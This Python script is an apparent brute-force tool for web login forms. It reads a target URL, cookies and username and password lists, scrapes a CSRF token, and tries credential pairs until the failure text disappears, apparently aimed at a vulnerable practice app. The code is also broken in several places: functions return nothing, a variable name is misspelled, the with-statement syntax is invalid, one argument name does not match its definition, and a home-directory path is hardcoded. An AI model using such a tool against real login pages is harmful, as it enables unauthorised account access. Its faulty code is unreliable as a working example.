#! /usr/bin/python3
import requests
from urllib.request import urlopen
import argparse
from lxml import etree
import os
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c","--cookies",dest="cookies",help="Cookies: -c PHPSESSID:f8ucrbu0qmta4ettc3208gcvnq; security:low")
    parser.add_argument("-u","--url",dest="url",help="URL: -u http://127.0.0.1/")
    parser.add_argument("-param","--param",dest="param",help="Param: -p username:admin; password:123456; OR -p username:^USER^; password:^PASS^")
    parser.add_argument("-l","--login",dest="login",help="Login: -l admin")
    parser.add_argument("-p","--password",dest="password",help="Password: -p password")
    parser.add_argument("-L","--loginlist",dest="loginlist",help="LoginList: -l ~/users.txt")
    parser.add_argument("-P","--passwordlist",dest="passwordlist",help="Password: -p password")
    parser.add_argument("-C","--csrfxpath",dest="csrfxpath",help="CSRF-Xpath: //input[@name='user_token']/@value")
    parser.add_argument("-F","--failedtext",dest="failedtext",help="Failed Login Text: Incorrect password")
    options = parser.parse_args()
    return options


def deserializer(serialized):
    deserialized = {}
    pairs = serialized.split(";")
    if pairs[-1]==";": 
        del pairs[-1]
    for pair in pairs:
        pair.split(":")
        deserialized[pair[0]] = pair[1]
    return deserialized


def send_request(url, params, username="", password="", cookies={}, csrf=""):
    if "^USER^" in params:
        params = params.replace("^USER^", username)
    if "^PASS^" in params:
        params = params.replace("^PASS^", password)
    if "^CSRF^" in params:
        params = params.replace("^CSRF^", csrf)         
    params = deserializer(params) if params else {}   
    r = requests.get(url, cookies=cookies, params=params)


def get_csrf(response, csrfxpath):
    with open('/home/baba/out.html','w+') as file:
        file.write(response.text)

    response = urlopen(f'file://{os.path.dirname(os.path.realpath(__file__))}/out.html')
    htmlparser = etree.HTMLParser()
    tree = etree.parse(response, htmlparser)

    sss = tree.xpath(csrfxpath)


def gameover(username, password):
    print(f"[+] Username : {username} \n[+] Password : {password} \n\n Exiting...")
    sys.exit()


arguments = get_arguments()


if arguments.url:
    URL = arguments.url
else:
    print("[-] Please provide either URL")    
    sys.exit()    


if arguments.login:
    username = arguments.login
elif arguments.loginlist:
    username_file_path = os.path.expanduser(arguments.loginlist)
else:
    print("[-] Please provide either username or username list.")    
    sys.exit()


if arguments.password:
    password = arguments.password
elif arguments.passwordlist:
    password_file_path = os.path.expanduser(arguments.passwordlist)
else:
    print("[-] Please provide either password or password list.")    
    sys.exit()


cookies = deserializer(arguments.cookies) if arguments.cookies else {}


response = send_request(URL, "", cookies=cookies)
print(response)
csrf = get_csrf(response, arguments.csrfxpath)


if argumets.loginlist:
    if arguments.passwordlist:
        with open(password_file_path,'r'), open(username_file_path,'r') as password_list, username_list:
            pw_list = password_list.read().split()
            uname_list = username_list.read().split()

        for uname in uname_list:
            for pw in pw_list:
                response = send_request(URL, arguments.params, uname, pw, cookies, csrf)
                if arguments.failedtext not in response.text:
                    gameover(uname, pw)
                csrf = get_csrf(response, arguments.csrfxpath)
    else:
        with open(username_file_path,'r') as username_list:
            uname_list = username_list.read().split()

        for uname in uname_list:
                response = send_request(URL, arguments.params, uname, password, cookies, csrf)
                if arguments.failedtext not in response.text:
                    gameover(uname, password)
                csrf = get_csrf(response, arguments.csrfxpath)
else:
    if arguments.passwordlist:
        with open(password_file_path,'r') as password_list:
            pw_list = password_list.read().split()

        for pw in pw_list:
            response = send_request(URL, arguments.params, username, pw, cookies, csrf)
            if arguments.failedtext not in response.text:
                    gameover(username, pw)
            csrf = get_csrf(response, arguments.csrfxpath)



